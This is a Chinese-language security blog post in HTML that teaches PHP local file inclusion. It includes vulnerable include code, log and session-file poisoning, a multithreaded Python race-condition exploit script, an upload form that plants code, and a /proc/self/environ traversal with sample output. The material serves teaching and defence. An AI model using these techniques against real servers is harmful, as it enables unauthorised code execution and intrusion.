@@ -1,0 +1,816 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>文件包含漏洞 | Ulysses'Blog</title><meta name="keywords" content="文件包含"><meta name="author" content="Ulysses"><meta name="copyright" content="Ulysses"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="文件包含漏洞的介绍介绍在程序中通过include等包含指令或函数引用外部文件时，若可以通过用户可控参数指定包含或引用的目标文件（也就是“包含”函数的参数是动态变量且用户可控），且没有对目标文件进行有效的安全检验，导致包含恶意代码的文件嵌入到程序空间并得到解析执行，从而造成文件包含漏洞。由于文件包含指令涉及比较少，在挖掘漏洞的时候很容易通过定位关键函数的方法定位漏洞。例如，PHP语言中关于包含的函数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞">
+<meta property="og:url" content="https://plumeria.ltd/post/4089de4e.html">
+<meta property="og:site_name" content="Ulysses&#39;Blog">
+<meta property="og:description" content="文件包含漏洞的介绍介绍在程序中通过include等包含指令或函数引用外部文件时，若可以通过用户可控参数指定包含或引用的目标文件（也就是“包含”函数的参数是动态变量且用户可控），且没有对目标文件进行有效的安全检验，导致包含恶意代码的文件嵌入到程序空间并得到解析执行，从而造成文件包含漏洞。由于文件包含指令涉及比较少，在挖掘漏洞的时候很容易通过定位关键函数的方法定位漏洞。例如，PHP语言中关于包含的函数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://plumeria.ltd/img/cover/inclusion.png">
+<meta property="article:published_time" content="2022-01-29T08:00:00.000Z">
+<meta property="article:modified_time" content="2022-01-29T08:45:40.296Z">
+<meta property="article:author" content="Ulysses">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://plumeria.ltd/img/cover/inclusion.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://plumeria.ltd/post/4089de4e"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.5/dist/instantsearch.min.js" defer></script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"0HPLBDYHPG","apiKey":"0c8875d1d08e28840a882f41ae37ed2e","indexName":"my blog","hits":{"per_page":6},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件包含漏洞',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-29 16:45:40'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    document.addEventListener('pjax:complete', detectApple)})(window)</script><link rel="stylesheet" href="/css/mycss.css"><style type="text/css">.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body{left:-66px!important}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover{left:0!important}</style><div class="aplayer" data-id="6997392079" data-server="netease" data-type="playlist" data-fixed="true" data-listFolded="false" data-order="random" data-preload="none"></div><link rel="stylesheet" href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/css/swiper.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiperstyle.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/tag_plugins.min.css" media="defer" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/hexo-butterfly-tag-plugins-plus@latest/lib/carousel-touch.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.css" media="defer" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">62</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/cover/inclusion.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ulysses'Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-gamepad"></i><span> 游戏机</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件包含漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-29T08:00:00.000Z" title="发表于 2022-01-29 16:00:00">2022-01-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-29T08:45:40.296Z" title="更新于 2022-01-29 16:45:40">2022-01-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/">Web安全攻防</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/">文件类型漏洞</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>27分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="文件包含漏洞"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="文件包含漏洞的介绍"><a href="#文件包含漏洞的介绍" class="headerlink" title="文件包含漏洞的介绍"></a>文件包含漏洞的介绍</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在程序中通过include等包含指令或函数引用外部文件时，若可以通过用户可控参数指定包含或引用的目标文件（也就是“包含”函数的参数是动态变量且用户可控），且没有对目标文件进行有效的安全检验，导致包含恶意代码的文件嵌入到程序空间并得到解析执行，从而造成文件包含漏洞。由于文件包含指令涉及比较少，在挖掘漏洞的时候很容易通过定位关键函数的方法定位漏洞。例如，PHP语言中关于包含的函数主要有<code>include</code>、<code>include_once</code>、<code>require</code>、<code>require_once</code>、<code>file_get_contents</code>、<code>fopen</code>、<code>file</code>、<code>readfile</code>等；JSP语言主要有<code>include</code>指令或<code>jsp:include</code>动作元素，以及<code>c:import</code>指令。</p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>根据包含目标文件的存储位置，文件包含分为：</p>
+<ul>
+<li>本地文件包含（Local File Inclusion，LFI）</li>
+<li>远程文件包含（Remote File Inclusion，RFI）</li>
+</ul>
+<p>其中，本地文件包含漏洞一般是上传或日志缓存写入等方法来包含恶意文件，远程文件包含漏洞这是引入远程的恶意文件、恶意代码或数据流造成文件包含漏洞。</p>
+<h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>包含本地服务器的文件且能正常执行被包含文件的代码是本地文件包含，若包含的是超出开发者本意的恶意文件时，则造成本地文件包含漏洞。</p>
+<h3 id="普通本地文件包含"><a href="#普通本地文件包含" class="headerlink" title="普通本地文件包含"></a>普通本地文件包含</h3><p>如，服务端脚本中含有以下代码的文件（LFI.php）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;./&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传恶意代码（test.txt）到服务端：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在浏览器访问路径：<code>http://hackroot.com/LFI.php?file=upload/test.txt</code>。触发本地包含漏洞。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/26/jbJxLylpHivt7z1.png" alt="image-20220126201255729"></p>
+<h3 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h3><p>利用条件：</p>
+<ul>
+<li>日志文件存储位置已知，且日志文件可读。</li>
+</ul>
+<p>中间件例如IIS、Apache、Nginx这些Web中间件，都会记录访问日志，如果日志中或错误日志中存在有PHP代码，也可以引入到文件包含中。如果日志有PHP恶意代码也会导致getshell。</p>
+<p>如，我们可以在Burp中构造恶意数据包，使Web服务器的错误日志文件包含我们的恶意代码：</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/26/zH1kRD3iN9K8BMe.png" alt="image-20220126210924379"></p>
+<p>不直接使用浏览器发送的原因是浏览器会自动进行URL编码。</p>
+<p><code>error.log</code>中已经记录了本次的错误信息，其中就有我们的恶意代码。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/26/jNHpqxeFLzE9CSG.png" alt="image-20220126204657059"></p>
+<p>利用本地文件包含即可执行。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/26/JHviaXCDT29Q76e.png" alt="image-20220126204852067"></p>
+<blockquote>
+<p>注：在Linux下日志文件权限默认为root，而php的权限是www-data，一般是读取不了的，如果是Windows环境下的是允许的。</p>
+<p>Linux默认的apache日志文件路径：</p>
+<ul>
+<li>访问日志：<code>/var/log/apache2/access.log</code></li>
+<li>错误日志：<code>/var/log/apache2/error.log</code></li>
+</ul>
+</blockquote>
+<h3 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h3><p>利用条件：</p>
+<ul>
+<li>PHP &gt;= 5.4.0</li>
+<li>session.upload_progress.enabled=On</li>
+</ul>
+<p>与<code>open_basedir</code>、<code>allow_url_fopen</code>、<code>allow_url_include</code>等PHP配置一样，<code>session.upload_progress</code>也是PHP的一个功能，同样可以在php.ini中设置相关属性。其中最重要的几个设置如下：</p>
+<ul>
+<li><code>session.upload_progress.enabled</code>：控制是否开启<code>session.upload_progress</code>功能</li>
+<li><code>session.upload_progress.cleanup</code>：控制是否在上传之后删除文件内容</li>
+<li><code>session.upload_progress.prefix</code>：设置上传文件内容的前缀</li>
+<li><code>session.upload_progress.name</code>：其值即为session中的键值</li>
+</ul>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/27/kOTmJfU5DGqH7Mi.png" alt="image-20220127182057488"></p>
+<p>可以利用<code>session.upload_progress</code>将WebShell写入session文件（通过修改PHPSESSID的值来自定义文件名），然后包含这个session文件（PHP版本&gt;=5.4.0）</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/27/E7RhdCSTl5XZoJ6.png" alt="image-20220127183248871"></p>
+<p>如，首先在本地构造上传页面（只用提交就行，不用管服务端有没有接收都会创建Session文件）：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>upload-POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- form表单，action中为服务端的URL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.1.14/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>	</span><br><span class="line">    <span class="comment">&lt;!-- session 上传 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span> &gt;</span>  </span><br><span class="line">    <span class="comment">&lt;!-------------------------------------------&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上传提交时，使用Burp抓包，在Cookie中添加PHPSESSID：</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/27/lI5Vxs2oOMpNakK.png" alt="image-20220127184915767"></p>
+<p>提交后，服务端就会生成一个Session文件，生成文件的路径为php.ini中<code>session.save_path</code>的值，一般在<code>/var/lib/php/session/</code>或<code>/tmp/</code>下。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/27/2cNrHtkn7gY63PZ.png" alt="image-20220127185424369"></p>
+<p>我们可以利用本地文件包含，执行Session文件中的恶意脚本。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/27/okhTKi7Jf2a86Bb.png" alt="image-20220127190033177"></p>
+<p>但是，当<code>session.upload_progress.cleanup</code>的值为On时，即使上传文件，但是上传完成之后文件内容会被清空，这怎么办？</p>
+<p>当然是利用条件竞争了！</p>
+<p>使用ctfshow群主的脚本，用多线程重放包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-20 09:51:29</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-20 14:33:23</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;shell&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.14/LFI.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>* <span class="number">1024</span> * <span class="number">50</span>)                     <span class="comment">#创建文件</span></span><br><span class="line">        response = session.post(                            <span class="comment">#post文件上传</span></span><br><span class="line">            url,                                            <span class="comment">#url</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,                   <span class="comment">#设置cookie为我们的sessid</span></span><br><span class="line">            data = &#123; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>&#125;,<span class="comment">#写马或执行内容</span></span><br><span class="line">            files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;                 <span class="comment">#上传文的具体内容，文件名和文件内容</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        payload = <span class="string">&quot;?file=../../../var/lib/php/session/sess_&quot;</span>+sessid                 <span class="comment">#包含我们的session路径</span></span><br><span class="line"></span><br><span class="line">        response = session.get(url = url+payload)           <span class="comment">#读取页面</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;k1he.txt&#x27;</span> <span class="keyword">in</span> response.text:                     <span class="comment">#返回页面</span></span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]retrying!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:                                  <span class="comment">#双线程运行</span></span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://192.168.1.14/LFI.php?file=../../../var/lib/php/session/sess_shell</code>，多刷新几下，即可看到命令执行的结果。</p>
+<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/27/Ypej85voDR3aiPT.png" alt="image-20220127194243629"></p>
+<h3 id="proc-self-environ-文件包含"><a href="#proc-self-environ-文件包含" class="headerlink" title="/proc/self/environ 文件包含"></a>/proc/self/environ 文件包含</h3><p>利用条件：</p>
+<ul>
+<li>php 以 cgi 方式运行，这样 environ 才会保持 UA 头。</li>
+<li>environ 文件存储位置已知，且 environ 文件可读。</li>
+</ul>
+<p>environ文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开，变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息：</p>
+<p>在浏览器访问路径：<code>http://localhost/LFI.php?file=../../../proc/self/environ</code></p>
+<p>如果看到类似如下信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOCUMENT_ROOT=/home/sirgod/public_html GATEWAY_INTERFACE=CGI/1.1 HTTP_ACCEPT=text/html, application/xml;q=0.9, application/xhtml+xml, p_w_picpath/png, p_w_picpath/jpeg, p_w_picpath/gif, p_w_picpath/x-xbitmap, */*;q=0.1 HTTP_COOKIE=PHPSESSID=134cc7261b341231b9594844ac2ad7ac HTTP_HOST=www.website.com HTTP_REFERER=http://www.website.com/index.php?view=../../../../../../etc/passwd HTTP_USER_AGENT=Opera/9.80 (Windows NT 5.1; U; en) Presto/2.2.15 Version/10.00 PATH=/bin:/usr/bin QUERY_STRING=view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron REDIRECT_STATUS=200 REMOTE_ADDR=6x.1xx.4x.1xx REMOTE_PORT=35665 REQUEST_METHOD=GET REQUEST_URI=/index.php?view=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron SCRIPT_FILENAME=/home/sirgod/public_html/index.php SCRIPT_NAME=/index.php SERVER_ADDR=1xx.1xx.1xx.6x SERVER_ADMIN=webmaster@website.com SERVER_NAME=www.website.com SERVER_PORT=80 SERVER_PROTOCOL=HTTP/1.0 SERVER_SIGNATURE=</span><br><span class="line">Apache/1.3.37 (Unix) mod_ssl/2.2.11 OpenSSL/0.9.8i DAV/2 mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at www.website.com Port 80</span><br></pre></td></tr></table></figure>
+<p>说明是可以访问的，如果返回时个空白页，说明是无法访问的。</p>
